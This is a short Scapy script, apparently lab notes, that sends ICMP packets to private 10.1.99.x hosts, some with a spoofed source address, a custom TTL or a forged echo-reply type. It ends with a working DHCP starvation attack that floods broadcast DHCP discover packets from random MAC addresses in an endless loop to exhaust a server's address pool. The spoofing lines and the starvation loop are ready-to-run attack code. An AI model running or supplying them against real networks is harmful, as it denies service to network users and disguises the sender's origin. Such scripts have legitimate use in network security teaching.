#from scapy.all import *

# Send ICMP packet
send(IP(dst="10.1.99.2")/ICMP()/"HelloWorld")

# Send ICMP packet, spoof origin
send(IP(src="10.1.99.100", dst="10.1.99.2")/ICMP()/"HelloWorld")

# Time to live
send(IP(src="10.1.99.100", dst="10.1.99.2", ttl=128)/ICMP()/"HelloWorld")

# Ping reply
send(IP(src="10.1.99.100", dst="10.1.99.2", ttl=128)/ICMP(type=0)/"HelloWorld")

# DHCP starvation attack
conf.checkIPaddr = False
dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
sendp(dhcp_discover,loop=1)
